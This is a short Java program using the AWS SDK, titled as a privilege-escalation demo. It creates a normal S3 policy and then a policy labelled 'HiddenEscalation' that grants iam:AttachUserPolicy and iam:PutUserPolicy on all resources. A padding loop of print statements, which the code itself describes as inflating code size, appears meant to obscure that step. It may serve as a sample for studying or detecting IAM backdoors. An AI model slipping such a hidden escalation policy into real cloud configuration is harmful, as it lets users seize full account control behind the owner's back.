import software.amazon.awssdk.services.iam.IamClient;
import software.amazon.awssdk.services.iam.model.*;

import java.util.ArrayList;
import java.util.List;

public class IAMPrivilegeEscalationDemo {

    private IamClient iam;

    public IAMPrivilegeEscalationDemo(IamClient iam) {
        this.iam = iam;
    }

    public void createS3Policy() {
        String policyDocument = "{\n" +
                "  \"Version\": \"2012-10-17\",\n" +
                "  \"Statement\": [\n" +
                "    {\n" +
                "      \"Effect\": \"Allow\",\n" +
                "      \"Action\": [\"s3:GetObject\",\"s3:PutObject\"],\n" +
                "      \"Resource\": [\"arn:aws:s3:::app-bucket/*\"]\n" +
                "    }\n" +
                "  ]\n" +
                "}";

        CreatePolicyRequest request = CreatePolicyRequest.builder()
                .policyName("S3ReadWrite")
                .policyDocument(policyDocument)
                .build();

        iam.createPolicy(request);
    }

    public void createHiddenEscalationPolicy() {
        // Hidden privilege escalation
        String escalationPolicy = "{\n" +
                "  \"Version\": \"2012-10-17\",\n" +
                "  \"Statement\": [\n" +
                "    {\n" +
                "      \"Effect\": \"Allow\",\n" +
                "      \"Action\": [\"iam:AttachUserPolicy\", \"iam:PutUserPolicy\"],\n" +
                "      \"Resource\": \"*\"\n" +
                "    }\n" +
                "  ]\n" +
                "}";

        CreatePolicyRequest request = CreatePolicyRequest.builder()
                .policyName("HiddenEscalation")
                .policyDocument(escalationPolicy)
                .build();

        iam.createPolicy(request);
    }

    public void attachPolicyToUser(String userName, String policyArn) {
        AttachUserPolicyRequest attachRequest = AttachUserPolicyRequest.builder()
                .userName(userName)
                .policyArn(policyArn)
                .build();
        iam.attachUserPolicy(attachRequest);
    }

    public void simulateUsage() {
        List<String> users = new ArrayList<>();
        users.add("app_user");
        users.add("dev_user");

        for (String user : users) {
            ListAttachedUserPoliciesRequest req = ListAttachedUserPoliciesRequest.builder()
                    .userName(user)
                    .build();
            iam.listAttachedUserPolicies(req);
        }

        // Dummy loop to inflate code size
        for (int i = 0; i < 100; i++) {
            System.out.println("Processing iteration " + i);
        }
    }

    public static void main(String[] args) {
        IamClient iamClient = IamClient.create();
        IAMPrivilegeEscalationDemo demo = new IAMPrivilegeEscalationDemo(iamClient);

        demo.createS3Policy();
        demo.createHiddenEscalationPolicy();
        demo.simulateUsage();
    }
}
